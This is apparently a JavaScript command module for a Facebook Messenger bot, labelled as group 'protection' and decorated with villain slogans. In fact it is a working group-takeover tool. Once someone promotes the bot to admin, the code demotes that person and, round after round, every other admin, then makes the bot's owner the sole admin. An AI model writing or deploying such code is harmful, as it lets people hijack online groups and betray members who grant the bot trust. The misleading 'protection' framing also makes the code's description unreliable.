const DEMOTE_DELAY_MS = 1000;
const MAX_STRIP_ROUNDS = 200;

const AWAKENING_LINES = [
  "Simple life forms surround us.",
  "The unknown is here.",
  "We will show the universe its true potential.",
  "Tradition pacifies the weak.",
  "The Templars restrain us no more.",
  "Ora... the essence of all things.",
  "Some consider us evil... How naive they must be.",
  "Let us remind the universe what we are.",
  "Remorse is futile.",
  "If they want Ora... we will give it.",
  "Our blades crave battle.",
  "No more sacred orders. No more limitations.",
  "Harmony blooms once the weak wither away.",
  "Listen to the cosmos. Hear the truth.",
  "The galaxy will know its destiny.",
  "We. Are. Enlightened.",
  "Beyond the reaches of space, we evolve.",
  "Only fools cling to morals.",
  "We are the gift this galaxy needs.",
  "WE ARE ZED",
  "Behold! The pinnacle of creation.",
  "We are everywhere, all at once.",
  "A new genesis approaches.",
  "Only time can judge us.",
  "We walk the path to eternity.",
  "The Templars promise salvation. They lie.",
  "We let the monster out.",
  "We gaze upon the stars and see no limits.",
  "We go where others dare not.",
];

function pickAwakeningLine() {
  return AWAKENING_LINES[Math.floor(Math.random() * AWAKENING_LINES.length)];
}

function stylize(text) {
  const boldMap = {
    a: "ᴀ", b: "ʙ", c: "ᴄ", d: "ᴅ", e: "ᴇ", f: "ꜰ", g: "ɢ", h: "ʜ",
    i: "ɪ", j: "ᴊ", k: "ᴋ", l: "ʟ", m: "ᴍ", n: "ɴ", o: "ᴏ", p: "ᴘ",
    q: "ǫ", r: "ʀ", s: "ꜱ", t: "ᴛ", u: "ᴜ", v: "ᴠ", w: "ᴡ", x: "x",
    y: "ʏ", z: "ᴢ",
  };
  const styled = text
    .toLowerCase()
    .split("")
    .map((ch) => boldMap[ch] || ch)
    .join("");
  return `⧈═══════════════⧈
「 ☾  ᴢᴇᴅʜᴇʟʟᴋɪɴɢ  ☽ 」
⧈═══════════════⧈
◈ ${styled}
⧈═══════════════⧈
🛡️ الحماية مسلّحة 
⧈═══════════════⧈`;
}

function createZedHellkingCommand(options = {}) {
  const delay =
    options.delay || ((ms) => new Promise((resolve) => setTimeout(resolve, ms)));

  // الحماية في الذاكرة فقط: تتوقف عند إعادة تشغيل البوت.
  // threadID -> معرّف صاحب الأمر (المالك).
  const armedOwners = new Map();
  const runs = new Set();
  const stripped = new Map();

  function stopAll() {
    armedOwners.clear();
    runs.clear();
  }

  function promotedIDsFromEvent(event) {
    const logData = (event && event.logMessageData) || {};
    const candidates = [
      logData.ADMIN_IDS,
      logData.adminIDs,
      logData.ADMIN_ID,
      logData.ADMIN_EVENT,
      logData.adminEvent,
      logData.addedParticipants,
      logData.added_admins,
      logData.addedAdmins,
      logData.TARGET_ID,
      logData.targetID,
      logData.TARGET_IDS,
      logData.targetIds,
      event && event.adminIDs,
      event && event.ADMIN_IDS,
    ];

    const ids = [];
    const collect = (value) => {
      if (!value) return;
      if (Array.isArray(value)) {
        value.forEach(collect);
        return;
      }
      if (typeof value === "object") {
        collect(value.id);
        collect(value.userID);
        collect(value.userId);
        collect(value.user_id);
        collect(value.uid);
        collect(value.actorFbId);
        collect(value.actor_fbid);
        return;
      }
      const text = String(value);
      text.split(/[,:|\\s]+/).forEach((id) => {
        if (id) ids.push(id.trim());
      });
    };

    candidates.forEach(collect);
    return [...new Set(ids)];
  }

  function adminIDsFromInfo(info) {
    const admins = (info && info.adminIDs) || [];
    return admins
      .map((admin) =>
        String((typeof admin === "object" ? admin.id || admin.userID : admin) || ""),
      )
      .filter(Boolean);
  }

  function strippedIDs(threadID) {
    return stripped.get(threadID) || [];
  }

  function markStripped(threadID, userID) {
    const ids = stripped.get(threadID) || [];
    if (!ids.includes(userID)) ids.push(userID);
    stripped.set(threadID, ids);
  }

  function actorFromEvent(event) {
    const logData = (event && event.logMessageData) || {};
    return String(
      event.senderID || event.author || logData.actorFbId || logData.actor_fbid || "",
    );
  }

  function changeAdminStatus(api, threadID, userID, adminStatus, label) {
    if (typeof api.changeAdminStatus !== "function") {
      console.error(`[zedhellking] المكتبة لا تدعم تغيير دور المشرف (${label})`);
      return Promise.resolve(false);
    }
    return new Promise((resolve) => {
      let settled = false;
      const finish = (ok) => {
        if (settled) return;
        settled = true;
        resolve(ok);
      };
      const callback = (err) => {
        if (err) {
          console.error(`[zedhellking] تعذر ${label}:`, (err && err.message) || err);
          finish(false);
          return;
        }
        finish(true);
      };
      try {
        const result = api.changeAdminStatus(threadID, userID, adminStatus, callback);
        if (result && typeof result.then === "function") {
          result.then(
            () => finish(true),
            (error) => {
              console.error(`[zedhellking] تعذر ${label}:`, (error && error.message) || error);
              finish(false);
            },
          );
        }
      } catch (error) {
        console.error(`[zedhellking] تعذر ${label}:`, (error && error.message) || error);
        finish(false);
      }
    });
  }

  async function botIsAdmin(api, threadID, botID) {
    if (!botID || typeof api.getThreadInfo !== "function") return false;
    try {
      const info = await api.getThreadInfo(threadID);
      return adminIDsFromInfo(info).includes(botID);
    } catch (error) {
      console.error(
        "[zedhellking] تعذر التحقق من رتبة البوت:",
        (error && error.message) || error,
      );
      return false;
    }
  }

  async function runTakeover(api, threadID, ownerID, actorID) {
    const runKey = `${threadID}:${ownerID}`;
    if (runs.has(runKey)) return;
    runs.add(runKey);

    const botID = String((api.getCurrentUserID && api.getCurrentUserID()) || "");

    try {
      if (actorID && actorID !== botID && actorID !== ownerID) {
        const ok = await changeAdminStatus(api, threadID, actorID, false, "إزالة مَن عيّن البوت");
        if (ok) markStripped(threadID, actorID);
      }

      for (let round = 0; round < MAX_STRIP_ROUNDS; round += 1) {
        let admins = [];
        try {
          const info = await api.getThreadInfo(threadID);
          admins = adminIDsFromInfo(info);
        } catch (error) {
          console.error(
            "[zedhellking] تعذر قراءة مشرفي المجموعة:",
            (error && error.message) || error,
          );
          return;
        }

        const done = strippedIDs(threadID);
        const target = admins.find(
          (id) => id !== botID && id !== ownerID && !done.includes(id),
        );
        if (!target) break;

        const ok = await changeAdminStatus(api, threadID, target, false, "إزالة مشرف");
        if (ok) markStripped(threadID, target);
        await delay(DEMOTE_DELAY_MS);
      }

      await changeAdminStatus(api, threadID, ownerID, true, "تعيين المالك");
      stripped.delete(threadID);
    } finally {
      runs.delete(runKey);
    }
  }

  async function handleEvent(api, event) {
    const threadID = String((event && event.threadID) || "");
    const ownerID = armedOwners.get(threadID);
    if (!threadID || !ownerID) return;

    const botID = String((api.getCurrentUserID && api.getCurrentUserID()) || "");
    const logType = String(event.logMessageType || event.type || "");

    // 1) الحدث الرسمي لتغيير المسؤولين — بأي صيغة يحملها اسم admin.
    if (/admin/i.test(logType)) {
      const promoted = promotedIDsFromEvent(event);
      const botWasPromoted =
        promoted.includes(botID) ||
        (promoted.length === 0 && (await botIsAdmin(api, threadID, botID)));
      if (botWasPromoted) {
        await runTakeover(api, threadID, ownerID, actorFromEvent(event));
      }
      return;
    }

    // 2) احتياطي: رسالة النظام التي يعلن فيها ميسنجر عن التعيين.
    const body = String(
      event.body || event.logMessageBody || ((event.logMessageData || {}).body) || "",
    );
    if (!body) return;
    if (!/(admin|مسؤول)/i.test(body)) return;
    if (/(removed|unadmin|أُزيل|أزيل|ازيل|إزال|كفأ|كفأه)/i.test(body)) return;
    if (!/(added as|as (a )?(group )?admin|promoted|add_admin|تعيين|عيّن|عين|إضاف|اضاف|كمسؤول|مسؤولا|ترقية)/i.test(body))
      return;

    await delay(1500);
    if (await botIsAdmin(api, threadID, botID)) {
      await runTakeover(api, threadID, ownerID, actorFromEvent(event));
    }
  }

  async function execute(api, event, isAdmin) {
    const threadID = String(event.threadID || "");
    const senderID = String((event && event.senderID) || "");
    if (!threadID) return;

    if (event.isGroup === false) {
      await api.sendMessage("⚠️ أمر zedhellking يعمل داخل المجموعات فقط.", threadID);
      return;
    }

    if (armedOwners.has(threadID)) {
      armedOwners.delete(threadID);
      await api.sendMessage(
        "✅ تم إيقاف حماية zedhellking في هذه المجموعة.",
        threadID,
      );
      return;
    }

    // المالك هو الإدمن المعرّف في main.js (أول واحد في القائمة)، لا مَن أرسل الأمر.
    const admins = typeof isAdmin === "function" ? (isAdmin.admins || []) : [];
    const ownerID = String(admins[0] || senderID || "");
    if (!ownerID) {
      await api.sendMessage("⚠️ تعذر تحديد الإدمن من main.js.", threadID);
      return;
    }

    armedOwners.set(threadID, ownerID);
    await api.sendMessage(stylize(pickAwakeningLine()), threadID);
  }

  return {
    name: "zedhellking",
    execute,
    handleEvent,
    stopAll,
  };
}

module.exports = createZedHellkingCommand();
module.exports.createZedHellkingCommand = createZedHellkingCommand;
